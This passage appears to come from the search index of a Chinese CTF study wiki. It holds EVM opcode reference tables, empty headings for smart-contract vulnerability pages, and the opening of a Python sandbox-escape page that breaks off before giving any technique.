\u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 80 DUP1 a a, a \u5c06\u6808\u9876\u6570\u636e\u590d\u5236\u4e00\u4efd\u5230\u6808\u9876 81 DUP2 _, a a, _, a \u590d\u5236\u6808\u4e0a\u7b2c 2 \u4e2a\u6570\u636e\u5230\u6808\u9876 82 DUP3 _, _, a a, _, _, a \u590d\u5236\u6808\u4e0a\u7b2c 3 \u4e2a\u6570\u636e\u5230\u6808\u9876 ... ... ... ... ... 8f DUP16 ... ... \u590d\u5236\u6808\u4e0a\u7b2c 16 \u4e2a\u6570\u636e\u5230\u6808\u9876 90 SWAP1 a, b b, a \u4ea4\u6362\u6808\u9876\u4e24\u4e2a\u6570\u636e 91 SWAP2 a, _, b b, _, a \u4ea4\u6362\u6808\u4e0a\u7b2c 2 \u4e2a\u6570\u636e\u548c\u6808\u9876\u6570\u636e 92 SWAP3 a, _, _, b b, _, _, a \u4ea4\u6362\u6808\u4e0a\u7b2c 3 \u4e2a\u6570\u636e\u548c\u6808\u9876\u6570\u636e ... ... ... ... ... 9f SWAP16 ... ... \u4ea4\u6362\u6808\u4e0a\u7b2c 16 \u4e2a\u6570\u636e\u548c\u6808\u9876\u6570\u636e \u8df3\u8f6c\u6307\u4ee4 \u00b6 EVM \u7684\u8df3\u8f6c\u6bd4\u8f83\u7279\u522b\uff0c\u5b83\u4e0d\u80fd\u968f\u610f\u8df3\u8f6c\u5230\u4efb\u4f55\u4f4d\u7f6e\uff0c\u53ea\u80fd\u8df3\u8f6c\u5230\u4e00\u4e2a JUMPDEST \u6307\u4ee4\u7684\u4f4d\u7f6e\u3002 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 56 JUMP dest \u8df3\u8f6c\u5230 dest \u4f4d\u7f6e 57 JUMPI dest, cond \u5982\u679c cond \u975e 0 \u5219\u8df3\u8f6c\u5230 dest \u4f4d\u7f6e 5b JUMPDEST \u6807\u8bb0\u4e00\u4e2a\u8df3\u8f6c\u76ee\u6807 \u65e5\u5fd7\u6307\u4ee4 \u00b6 \u5728\u94fe\u4e0a\u8bb0\u5f55\u65e5\u5fd7\uff0c\u4e5f\u5c31\u662f event\u3002 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 a0 LOG0 offset, length LOG0(mem[offset:offset+length]) a1 LOG1 offset, length, topic0 LOG1(mem[offset:offset+length], topic0) ... ... ... ... a4 LOG4 offset, length, topic0~3 LOG4(mem[offset:offset+length], topic0~3) \u521b\u5efa\u5408\u7ea6\u5730\u5740\u6307\u4ee4 \u00b6 \u521b\u5efa\u5408\u7ea6\u5730\u5740\u6709\u4e24\u79cd\u6307\u4ee4\uff0cCREATE \u548c CREATE2\uff0c\u540e\u8005\u662f\u541b\u58eb\u5766\u4e01\u5821\u786c\u5206\u53c9\u540e\u5f15\u5165\u7684\u3002 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 f0 CREATE value, offset, length address f5 CREATE2 value, offset, length, salt address \u8c03\u7528\u3001\u8fd4\u56de\u3001\u81ea\u6bc1\u6307\u4ee4 \u00b6 \u8fdc\u7a0b\u8c03\u7528\u6307\u4ee4 \u00b6 EVM \u4e2d\u8fdc\u7a0b\u8c03\u7528\u6709\u56db\u79cd\uff1a call\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u5982\u679c\u6709\u72b6\u6001\u4fee\u6539\uff0c\u4fee\u6539\u7684\u662f\u88ab\u8c03\u7528\u5408\u7ea6\u7684\u72b6\u6001 callcode\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u5982\u679c\u6709\u72b6\u6001\u4fee\u6539\uff0c\u4fee\u6539\u7684\u662f\u8c03\u7528\u5408\u7ea6\u7684\u72b6\u6001\uff08\u4e0d\u5efa\u8bae\u4f7f\u7528\uff0c\u7531 delegatecall \u53d6\u4ee3\uff09 delegatecall\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u5982\u679c\u6709\u72b6\u6001\u4fee\u6539\uff0c\u4fee\u6539\u7684\u662f\u8c03\u7528\u5408\u7ea6\u7684\u72b6\u6001 staticcall\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u4e0d\u80fd\u5b58\u5728\u72b6\u6001\u4fee\u6539 \u5176\u4e2d callcode \u548c delegatecall \u7684\u533a\u522b\u662f\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u8c03\u7528\uff1aAlice \u901a\u8fc7\u4ea4\u6613\u8c03\u7528\u4e86\u5408\u7ea6 A\uff0c\u5408\u7ea6 A \u4e2d\u901a\u8fc7\u67d0\u4e00\u8fdc\u7a0b\u8c03\u7528\u8c03\u7528\u4e86\u5408\u7ea6 B\uff0c\u90a3\u4e48\uff1a callcode\uff1a\u5408\u7ea6 A \u4e2d\u7684 msg.sender \u662f Alice\uff0c\u5408\u7ea6 B \u4e2d\u7684 msg.sender \u662f A delegatecall\uff1a\u5408\u7ea6 A \u548c B \u4e2d\u7684 msg.sender \u90fd\u662f Alice \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa f1 CALL gas, to, value, argsOffset, argsLength, retOffset, retLength success f2 CALLCODE gas, to, value, argsOffset, argsLength, retOffset, retLength success f4 DELEGATECALL gas, to, argsOffset, argsLength, retOffset, retLength success fa STATICCALL gas, to, argsOffset, argsLength, retOffset, retLength success \u8fd4\u56de\u6307\u4ee4 \u00b6 \u8fd4\u56de\u6307\u4ee4\u4e5f\u53ef\u4ee5\u7b97\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f RETURN \u6b63\u5e38\u8fd4\u56de\uff0c\u53e6\u4e00\u79cd\u662f REVERT \u5f02\u5e38\u56de\u6eda\uff08\u540c\u65f6 REVERT \u4f1a\u56de\u6eda\u6240\u6709\u7684\u72b6\u6001\u4fee\u6539\uff09\u3002 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 f3 RETURN offset, length return mem[offset:offset+length] fd REVERT offset, length revert mem[offset:offset+length] \u81ea\u6bc1\u6307\u4ee4 \u00b6 \u81ea\u6bc1\u5373 solidity \u4ee3\u7801\u4e2d\u7684 selfdestruct\uff0c\u9500\u6bc1\u5f53\u524d\u5408\u7ea6\uff0c\u5e76\u5c06\u6240\u6709\u4f59\u989d\u8f6c\u79fb\u5230\u6307\u5b9a\u5730\u5740\u3002 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 ff SELFDESTRUCT address selfdestruct(address) EVM \u9006\u5411 \u00b6 \u6709\u65f6\u9898\u76ee\u4e0d\u4f1a\u7ed9\u51fa\u5408\u7ea6\u6e90\u7801\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u5bf9\u5b57\u8282\u7801\u8fdb\u884c\u9006\u5411\u3002\u4e00\u4e9b\u5e38\u7528\u7684\u7f51\u7ad9\uff1a ethervm.io/decompile dedaube Contract Library etherscan Binary Ninja \u7684\u63d2\u4ef6 crytic/ethersplay etherscan \u4e0a\u4e5f\u662f\u6709\u9006\u5411\u529f\u80fd\u7684","title":"\u4ee5\u592a\u574a\u865a\u62df\u673a"},{"location":"ctf/blockchain/eth/evm/#_1","text":"Abstract \u4ee5\u592a\u574a\u7684\u667a\u80fd\u5408\u7ea6\u4f1a\u5728 EVM\uff08Ethereum Virtual Machine\uff0c\u4ee5\u592a\u574a\u865a\u62df\u673a\uff09\u4e0a\u8fd0\u884c\u3002\u672c\u6587\u4e3b\u8981\u4ecb\u7ecd EVM \u7684\u57fa\u7840\u77e5\u8bc6\u3002 \u53c2\u8003 Ethereum Virtual Machine (EVM) Opcodes Ethereum Yellow Paper Ethereum Developer Documentation Ethereum EVM Illustrated","title":"\u4ee5\u592a\u574a\u865a\u62df\u673a"},{"location":"ctf/blockchain/eth/evm/#evm","text":"EVM \u662f\u4e00\u4e2a\u6808\u7ed3\u6784\u7684\u865a\u62df\u673a\uff0c\u6ca1\u6709\u5bc4\u5b58\u5668\uff0c\u6808\u7684\u6df1\u5ea6\u6700\u5927 1024\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f 256 \u4f4d\uff0832 \u5b57\u8282\uff09\u7684\u3002\u540c\u65f6\u5728\u6267\u884c\u671f\u95f4\u4f1a\u7ef4\u62a4\u4e00\u4e2a\u77ac\u65f6\u5185\u5b58\uff08memory\uff09\uff0c\u5176\u6267\u884c\u540e\u4e0d\u4f1a\u6301\u4e45\u5b58\u5728\u3002 EVM \u6709\u4e00\u5957\u6307\u4ee4\u96c6\uff0c\u6bcf\u6761\u6307\u4ee4\u90fd\u6709\u4e00\u4e2a 8 \u4f4d\u7684 opcode\uff0c\u6307\u4ee4\u7684\u53c2\u6570\u53ef\u4ee5\u662f\u7acb\u5373\u6570\u3001\u6808\u5143\u7d20\u7b49\u3002","title":"EVM \u7b80\u4ecb"},{"location":"ctf/blockchain/eth/evm/#evm_1","text":"\u5b8c\u6574\u7684 EVM \u5b57\u8282\u7801\u53ca\u89e3\u91ca\u53ef\u89c1\uff1a ethervm.io \uff0c\u8fd9\u91cc\u8fdb\u884c\u4e00\u4e0b\u5206\u7c7b\uff1a","title":"EVM \u5b57\u8282\u7801"},{"location":"ctf/blockchain/eth/evm/#_2","text":"\u6ca1\u6709\u7279\u6b8a\u8bf4\u660e\u90fd\u662f\u5728\u6a21 2^256 \u7684\u610f\u4e49\u4e0b\u8fdb\u884c\u8fd0\u7b97\u3002 Note \u4e0b\u9762\u8868\u683c\u4e2d\u7684\u6808\u8f93\u5165\u3001\u6808\u8f93\u51fa\u5747\u662f\u5de6\u4fa7\u4e3a\u6808\u9876 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 01 ADD a, b a + b 02 MUL a, b a * b 03 SUB a, b a - b 04 DIV a, b a // b uint256 \u9664\u6cd5 05 SDIV a, b a // b int256 \u9664\u6cd5 06 MOD a, b a % b uint256 \u53d6\u6a21 07 SMOD a, b a % b int256 \u53d6\u6a21 08 ADDMOD a, b, c (a + b) % c 09 MULMOD a, b, c (a * b) % c 0a EXP a, b a ** b 0b SIGNEXTEND b, x signextend(x, b) \u5c06 x \u4ece (b+1)*8 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 256 \u4f4d \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 10 LT a, b a < b 11 GT a, b a > b 12 SLT a, b a < b int256 \u6bd4\u8f83 13 SGT a, b a > b int256 \u6bd4\u8f83 14 EQ a, b a == b 15 ISZERO a a == 0 16 AND a, b a & b 17 OR a, b a | b 18 XOR a, b a ^ b 19 NOT a ~a 1a BYTE i, x x[i] \u53d6 x \u7684\u7b2c i \u4e2a\u5b57\u8282\uff08\u4ece\u9ad8\u4f4d\u7b97\uff09 1b SHL a, b b << a 1c SHR a, b b >> a \u903b\u8f91\u53f3\u79fb 1d SAR a, b b >> a \u7b97\u6570\u53f3\u79fb \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa 20 SHA3 offset, length keccak256(mem[offset:offset+length])","title":"\u8fd0\u7b97\u6307\u4ee4"},{"location":"ctf/blockchain/eth/evm/#_3","text":"\u4e00\u4e9b\u4ee5\u592a\u574a\u7279\u6709\u7684\u6307\u4ee4\uff0c\u6bd4\u5982\u53d6\u4e00\u4e9b\u4ea4\u6613\u4fe1\u606f\u3001\u533a\u5757\u4fe1\u606f\u7b49 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 30 ADDRESS address \u5f53\u524d\u5408\u7ea6\u5730\u5740 31 BALANCE addr addr.balance 32 ORIGIN tx.origin 33 CALLER msg.sender 34 CALLVALUE msg.value 35 CALLDATALOAD i msg.data[i:i+32] 36 CALLDATASIZE len(msg.data) 38 CODESIZE len(this.code) 3a GASPRICE tx.gasprice 3b EXTCODESIZE addr len(addr.code) 3d RETURNDATASIZE len(returndata) \u4e0a\u4e00\u6b21\u8c03\u7528\u7684\u8fd4\u56de\u6570\u636e\u957f\u5ea6 3f EXTCODEHASH addr keccak256(addr.code) \u5730\u5740\u4e0d\u5b58\u5728\u5219\u8fd4\u56de 0 40 BLOCKHASH number block.blockHash(blockNumber) 41 COINBASE block.coinbase 42 TIMESTAMP block.timestamp 43 NUMBER block.number 44 DIFFICULTY block.difficulty 45 GASLIMIT block.gaslimit 46 CHAINID chainid 47 SELFBALANCE this.balance 48 BASEFEE block.basefee \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 37 CALLDATACOPY memOffset, dataOffset, length mem[memOffset:memOffset+length] = msg.data[dataOffset:dataOffset+length] 39 CODECOPY memOffset, codeOffset, length mem[memOffset:memOffset+length] = this.code[codeOffset:codeOffset+length] 3c EXTCODECOPY addr, memOffset, codeOffset, length mem[memOffset:memOffset+length] = addr.code[codeOffset:codeOffset+length] 3e RETURNDATACOPY memOffset, dataOffset, length mem[memOffset:memOffset+length] = returndata[dataOffset:dataOffset+length] \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 58 PC pc \u5f53\u524d\u6307\u4ee4\u7684\u4f4d\u7f6e 59 MSIZE mem.length \u5185\u5b58\u5927\u5c0f 5a GAS gas \u5269\u4f59 gas","title":"\u7279\u6b8a\u6307\u4ee4"},{"location":"ctf/blockchain/eth/evm/#_4","text":"EVM \u6267\u884c\u65f6\u6709\u4e09\u4e2a\u5b58\u50a8\u4f4d\u7f6e\uff1a \u6808\uff08stack\uff09\uff1a\u901a\u8fc7 PUSH\u3001POP \u7cfb\u5217\u5728\u5f53\u524d\u6267\u884c\u7684\u6808\u4e0a\u8fdb\u884c\u8bfb\u5199 \u5185\u5b58\uff08memory\uff09\uff1a\u901a\u8fc7 MLOAD\u3001MSTORE \u7cfb\u5217\u5728\u5f53\u524d\u6267\u884c\u7684\u5185\u5b58\u4e0a\u8fdb\u884c\u8bfb\u5199 \u94fe\u4e0a\u5b58\u50a8\uff08storage\uff09\uff1a\u901a\u8fc7 SLOAD\u3001SSTORE \u7cfb\u5217\u5728\u5f53\u524d\u5408\u7ea6\u7684\u5b58\u50a8\u533a\u8fdb\u884c\u8bfb\u5199\uff08\u662f\u6301\u4e45\u5316\u7684\uff09 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 50 POP a 51 MLOAD offset mem[offset:offset+32] 52 MSTORE offset, value mem[offset:offset+32] = value 53 MSTORE8 offset, value mem[offset] = value 54 SLOAD key storage[key] 55 SSTORE key, value storage[key] = value \u5e76\u4e14\u63d0\u4f9b\u4e86\u5f88\u591a PUSH \u6307\u4ee4\uff0c\u5206\u522b\u5904\u7406\u4e0d\u540c\u5927\u5c0f\u7684\u8f93\u5165\u7acb\u5373\u6570\uff1a \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 60 PUSH1 uint8 \u538b\u5165\u4e00\u4e2a 1 \u5b57\u8282\u7684\u503c 61 PUSH2 uint16 \u538b\u5165\u4e00\u4e2a 2 \u5b57\u8282\u7684\u503c ... ... ... ... ... 7f PUSH32 uint256 \u538b\u5165\u4e00\u4e2a 32 \u5b57\u8282\u7684\u503c \u4ee5\u53ca\u4e00\u4e9b\u6808\u4e0a\u7684\u6570\u636e\u64cd\u4f5c\uff0c\u5373 DUP \u548c SWAP\uff0c\u5206\u522b\u8868\u793a\u590d\u5236\u6808\u4e0a\u67d0\u5904\u6570\u636e\u5230\u6808\u9876\u4ee5\u53ca\u4ea4\u6362\u6808\u4e0a\u4e24\u4e2a\u6570\u636e\uff1a \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 80 DUP1 a a, a \u5c06\u6808\u9876\u6570\u636e\u590d\u5236\u4e00\u4efd\u5230\u6808\u9876 81 DUP2 _, a a, _, a \u590d\u5236\u6808\u4e0a\u7b2c 2 \u4e2a\u6570\u636e\u5230\u6808\u9876 82 DUP3 _, _, a a, _, _, a \u590d\u5236\u6808\u4e0a\u7b2c 3 \u4e2a\u6570\u636e\u5230\u6808\u9876 ... ... ... ... ... 8f DUP16 ... ... \u590d\u5236\u6808\u4e0a\u7b2c 16 \u4e2a\u6570\u636e\u5230\u6808\u9876 90 SWAP1 a, b b, a \u4ea4\u6362\u6808\u9876\u4e24\u4e2a\u6570\u636e 91 SWAP2 a, _, b b, _, a \u4ea4\u6362\u6808\u4e0a\u7b2c 2 \u4e2a\u6570\u636e\u548c\u6808\u9876\u6570\u636e 92 SWAP3 a, _, _, b b, _, _, a \u4ea4\u6362\u6808\u4e0a\u7b2c 3 \u4e2a\u6570\u636e\u548c\u6808\u9876\u6570\u636e ... ... ... ... ... 9f SWAP16 ... ... \u4ea4\u6362\u6808\u4e0a\u7b2c 16 \u4e2a\u6570\u636e\u548c\u6808\u9876\u6570\u636e","title":"\u5b58\u50a8\u6307\u4ee4"},{"location":"ctf/blockchain/eth/evm/#_5","text":"EVM \u7684\u8df3\u8f6c\u6bd4\u8f83\u7279\u522b\uff0c\u5b83\u4e0d\u80fd\u968f\u610f\u8df3\u8f6c\u5230\u4efb\u4f55\u4f4d\u7f6e\uff0c\u53ea\u80fd\u8df3\u8f6c\u5230\u4e00\u4e2a JUMPDEST \u6307\u4ee4\u7684\u4f4d\u7f6e\u3002 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 56 JUMP dest \u8df3\u8f6c\u5230 dest \u4f4d\u7f6e 57 JUMPI dest, cond \u5982\u679c cond \u975e 0 \u5219\u8df3\u8f6c\u5230 dest \u4f4d\u7f6e 5b JUMPDEST \u6807\u8bb0\u4e00\u4e2a\u8df3\u8f6c\u76ee\u6807","title":"\u8df3\u8f6c\u6307\u4ee4"},{"location":"ctf/blockchain/eth/evm/#_6","text":"\u5728\u94fe\u4e0a\u8bb0\u5f55\u65e5\u5fd7\uff0c\u4e5f\u5c31\u662f event\u3002 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 a0 LOG0 offset, length LOG0(mem[offset:offset+length]) a1 LOG1 offset, length, topic0 LOG1(mem[offset:offset+length], topic0) ... ... ... ... a4 LOG4 offset, length, topic0~3 LOG4(mem[offset:offset+length], topic0~3)","title":"\u65e5\u5fd7\u6307\u4ee4"},{"location":"ctf/blockchain/eth/evm/#_7","text":"\u521b\u5efa\u5408\u7ea6\u5730\u5740\u6709\u4e24\u79cd\u6307\u4ee4\uff0cCREATE \u548c CREATE2\uff0c\u540e\u8005\u662f\u541b\u58eb\u5766\u4e01\u5821\u786c\u5206\u53c9\u540e\u5f15\u5165\u7684\u3002 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 f0 CREATE value, offset, length address f5 CREATE2 value, offset, length, salt address","title":"\u521b\u5efa\u5408\u7ea6\u5730\u5740\u6307\u4ee4"},{"location":"ctf/blockchain/eth/evm/#_8","text":"","title":"\u8c03\u7528\u3001\u8fd4\u56de\u3001\u81ea\u6bc1\u6307\u4ee4"},{"location":"ctf/blockchain/eth/evm/#_9","text":"EVM \u4e2d\u8fdc\u7a0b\u8c03\u7528\u6709\u56db\u79cd\uff1a call\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u5982\u679c\u6709\u72b6\u6001\u4fee\u6539\uff0c\u4fee\u6539\u7684\u662f\u88ab\u8c03\u7528\u5408\u7ea6\u7684\u72b6\u6001 callcode\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u5982\u679c\u6709\u72b6\u6001\u4fee\u6539\uff0c\u4fee\u6539\u7684\u662f\u8c03\u7528\u5408\u7ea6\u7684\u72b6\u6001\uff08\u4e0d\u5efa\u8bae\u4f7f\u7528\uff0c\u7531 delegatecall \u53d6\u4ee3\uff09 delegatecall\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u5982\u679c\u6709\u72b6\u6001\u4fee\u6539\uff0c\u4fee\u6539\u7684\u662f\u8c03\u7528\u5408\u7ea6\u7684\u72b6\u6001 staticcall\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u4e0d\u80fd\u5b58\u5728\u72b6\u6001\u4fee\u6539 \u5176\u4e2d callcode \u548c delegatecall \u7684\u533a\u522b\u662f\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u8c03\u7528\uff1aAlice \u901a\u8fc7\u4ea4\u6613\u8c03\u7528\u4e86\u5408\u7ea6 A\uff0c\u5408\u7ea6 A \u4e2d\u901a\u8fc7\u67d0\u4e00\u8fdc\u7a0b\u8c03\u7528\u8c03\u7528\u4e86\u5408\u7ea6 B\uff0c\u90a3\u4e48\uff1a callcode\uff1a\u5408\u7ea6 A \u4e2d\u7684 msg.sender \u662f Alice\uff0c\u5408\u7ea6 B \u4e2d\u7684 msg.sender \u662f A delegatecall\uff1a\u5408\u7ea6 A \u548c B \u4e2d\u7684 msg.sender \u90fd\u662f Alice \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa f1 CALL gas, to, value, argsOffset, argsLength, retOffset, retLength success f2 CALLCODE gas, to, value, argsOffset, argsLength, retOffset, retLength success f4 DELEGATECALL gas, to, argsOffset, argsLength, retOffset, retLength success fa STATICCALL gas, to, argsOffset, argsLength, retOffset, retLength success","title":"\u8fdc\u7a0b\u8c03\u7528\u6307\u4ee4"},{"location":"ctf/blockchain/eth/evm/#_10","text":"\u8fd4\u56de\u6307\u4ee4\u4e5f\u53ef\u4ee5\u7b97\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f RETURN \u6b63\u5e38\u8fd4\u56de\uff0c\u53e6\u4e00\u79cd\u662f REVERT \u5f02\u5e38\u56de\u6eda\uff08\u540c\u65f6 REVERT \u4f1a\u56de\u6eda\u6240\u6709\u7684\u72b6\u6001\u4fee\u6539\uff09\u3002 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 f3 RETURN offset, length return mem[offset:offset+length] fd REVERT offset, length revert mem[offset:offset+length]","title":"\u8fd4\u56de\u6307\u4ee4"},{"location":"ctf/blockchain/eth/evm/#_11","text":"\u81ea\u6bc1\u5373 solidity \u4ee3\u7801\u4e2d\u7684 selfdestruct\uff0c\u9500\u6bc1\u5f53\u524d\u5408\u7ea6\uff0c\u5e76\u5c06\u6240\u6709\u4f59\u989d\u8f6c\u79fb\u5230\u6307\u5b9a\u5730\u5740\u3002 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 ff SELFDESTRUCT address selfdestruct(address)","title":"\u81ea\u6bc1\u6307\u4ee4"},{"location":"ctf/blockchain/eth/evm/#evm_2","text":"\u6709\u65f6\u9898\u76ee\u4e0d\u4f1a\u7ed9\u51fa\u5408\u7ea6\u6e90\u7801\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u5bf9\u5b57\u8282\u7801\u8fdb\u884c\u9006\u5411\u3002\u4e00\u4e9b\u5e38\u7528\u7684\u7f51\u7ad9\uff1a ethervm.io/decompile dedaube Contract Library etherscan Binary Ninja \u7684\u63d2\u4ef6 crytic/ethersplay etherscan \u4e0a\u4e5f\u662f\u6709\u9006\u5411\u529f\u80fd\u7684","title":"EVM \u9006\u5411"},{"location":"ctf/blockchain/eth/vuln/","text":"\u5e38\u89c1\u5408\u7ea6\u6f0f\u6d1e\u653b\u51fb\u624b\u6bb5 \u00b6 Abstract \u4e00\u4e9b\u7ecf\u5178\u3001\u5e38\u89c1\u7684\u667a\u80fd\u5408\u7ea6\u6f0f\u6d1e\u548c\u653b\u51fb\u624b\u6bb5 TODO \u6574\u578b\u6ea2\u51fa \u00b6 \u53d8\u957f\u6570\u7ec4\u957f\u5ea6\u4e0b\u6ea2\u4efb\u610f\u5199 \u00b6 \u91cd\u5165\u653b\u51fb \u00b6 \u4f2a\u968f\u673a\u6570 \u00b6 \u8585\u7f8a\u6bdb\u653b\u51fb \u00b6 \u8bfb\u53d6\u79c1\u6709\u53d8\u91cf \u00b6 \u8fdc\u7a0b\u8c03\u7528 \u00b6 \u81ea\u6bc1\u5f3a\u5236\u8f6c\u8d26 \u00b6","title":"\u5e38\u89c1\u5408\u7ea6\u6f0f\u6d1e\u653b\u51fb\u624b\u6bb5"},{"location":"ctf/blockchain/eth/vuln/#_1","text":"Abstract \u4e00\u4e9b\u7ecf\u5178\u3001\u5e38\u89c1\u7684\u667a\u80fd\u5408\u7ea6\u6f0f\u6d1e\u548c\u653b\u51fb\u624b\u6bb5 TODO","title":"\u5e38\u89c1\u5408\u7ea6\u6f0f\u6d1e\u653b\u51fb\u624b\u6bb5"},{"location":"ctf/blockchain/eth/vuln/#_2","text":"","title":"\u6574\u578b\u6ea2\u51fa"},{"location":"ctf/blockchain/eth/vuln/#_3","text":"","title":"\u53d8\u957f\u6570\u7ec4\u957f\u5ea6\u4e0b\u6ea2\u4efb\u610f\u5199"},{"location":"ctf/blockchain/eth/vuln/#_4","text":"","title":"\u91cd\u5165\u653b\u51fb"},{"location":"ctf/blockchain/eth/vuln/#_5","text":"","title":"\u4f2a\u968f\u673a\u6570"},{"location":"ctf/blockchain/eth/vuln/#_6","text":"","title":"\u8585\u7f8a\u6bdb\u653b\u51fb"},{"location":"ctf/blockchain/eth/vuln/#_7","text":"","title":"\u8bfb\u53d6\u79c1\u6709\u53d8\u91cf"},{"location":"ctf/blockchain/eth/vuln/#_8","text":"","title":"\u8fdc\u7a0b\u8c03\u7528"},{"location":"ctf/blockchain/eth/vuln/#_9","text":"","title":"\u81ea\u6bc1\u5f3a\u5236\u8f6c\u8d26"},{"location":"ctf/blockchain/solana/","text":"Solana \u00b6 TODO","title":"Solana"},{"location":"ctf/blockchain/solana/#solana","text":"TODO","title":"Solana"},{"location":"ctf/escapes/","text":"\u6c99\u7bb1\u9003\u9038 \u00b6 In computer security, a sandbox is a security mechanism for separating running programs, usually in an effort to mitigate system failures and/or software vulnerabilities from spreading. It is often used to execute untested or untrusted programs or code, possibly from unverified or untrusted third parties, suppliers, users or websites, without risking harm to the host machine or operating system. A sandbox typically provides a tightly controlled set of resources for guest programs to run in, such as storage and memory scratch space. \u2014\u2014\u2014\u2014 Wikipedia Abstract CTF \u4e2d\u6709\u4e00\u4e9b\u9898\u76ee\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u6c99\u7bb1\u6765\u8fd0\u884c\u4f60\u7684\u4ee3\u7801\uff0c\u9700\u8981\u9003\u9038\u51fa\u8fd9\u4e2a\u6c99\u7bb1\u6765\u6267\u884c\u4e00\u4e9b\u4ee3\u7801\u6765\u83b7\u53d6\u670d\u52a1\u5668\u4e2d\u5b58\u50a8\u7684 flag \u8fd9\u91cc\u5199\u4e00\u4e9b\u5e38\u89c1\u7684\u901a\u7528\u7684\u6c99\u7bb1\u9003\u9038\u65b9\u6cd5 Table of Contents \u00b6 Python \u6c99\u7bb1\u9003\u9038","title":"\u6c99\u7bb1\u9003\u9038"},{"location":"ctf/escapes/#_1","text":"In computer security, a sandbox is a security mechanism for separating running programs, usually in an effort to mitigate system failures and/or software vulnerabilities from spreading. It is often used to execute untested or untrusted programs or code, possibly from unverified or untrusted third parties, suppliers, users or websites, without risking harm to the host machine or operating system. A sandbox typically provides a tightly controlled set of resources for guest programs to run in, such as storage and memory scratch space. \u2014\u2014\u2014\u2014 Wikipedia Abstract CTF \u4e2d\u6709\u4e00\u4e9b\u9898\u76ee\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u6c99\u7bb1\u6765\u8fd0\u884c\u4f60\u7684\u4ee3\u7801\uff0c\u9700\u8981\u9003\u9038\u51fa\u8fd9\u4e2a\u6c99\u7bb1\u6765\u6267\u884c\u4e00\u4e9b\u4ee3\u7801\u6765\u83b7\u53d6\u670d\u52a1\u5668\u4e2d\u5b58\u50a8\u7684 flag \u8fd9\u91cc\u5199\u4e00\u4e9b\u5e38\u89c1\u7684\u901a\u7528\u7684\u6c99\u7bb1\u9003\u9038\u65b9\u6cd5","title":"\u6c99\u7bb1\u9003\u9038"},{"location":"ctf/escapes/#table-of-contents","text":"Python \u6c99\u7bb1\u9003\u9038","title":"Table of Contents"},{"location":"ctf/escapes/pysandbox/","text":"Python \u6c99\u7bb1\u9003\u9038 \u00b6 \u4e3a\u4ec0\u4e48\u9003\u9038\uff1f \u00b6 Python \u91cc\u7684 eval \u548c exec \u53ef\u4ee5\u7528\u6765\u6267\u884c\u4e00\u4e9b\u4ee3\u7801\u6765\u5e72\u574f\u4e8b \u4f46\u662f\u9898\u76ee\u90fd\u4f1a\u7ed9\u4e00\u4e9b\u5947\u5947\u602a\u602a\u7684\u3001\u770b\u8d77\u6765\u4e25\u5bc6\u7684\u9650\u5236\u9632\u6b62\u5e72\u574f\u4e8b \u8fd9\u65f6\u5019\u5c31\u8981\u627e\u65b9\u6cd5\u7ed5\u8fc7\u9650\u5236\u6765\u5e72\u574f\u4e8b\uff0c\u4e5f\u5c31\u662f\u6c99\u7bb1\u9003\u9038 eval \u548c exec \u6709\u4ec0\u4e48\u533a\u522b \u00b6 eval ( expression [, globals [, locals ]]) exec ( expression [, 